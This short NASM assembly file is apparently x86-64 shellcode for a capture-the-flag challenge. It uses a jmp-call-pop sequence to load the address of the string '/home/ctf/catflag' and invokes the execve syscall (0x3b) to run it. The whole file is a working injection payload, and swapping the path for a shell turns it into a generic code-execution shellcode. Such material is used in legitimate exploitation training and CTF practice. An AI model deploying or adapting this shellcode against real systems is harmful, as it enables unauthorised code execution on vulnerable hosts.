; this needs to be compiled with nasm
section .text
global _start
_start:
jmp short binsh
shellcode:
    pop rdi
    xor eax, eax
    add eax, 0x3b
    xor esi, esi
    xor edx, edx
    syscall
binsh:
	call shellcode
	db "/home/ctf/catflag"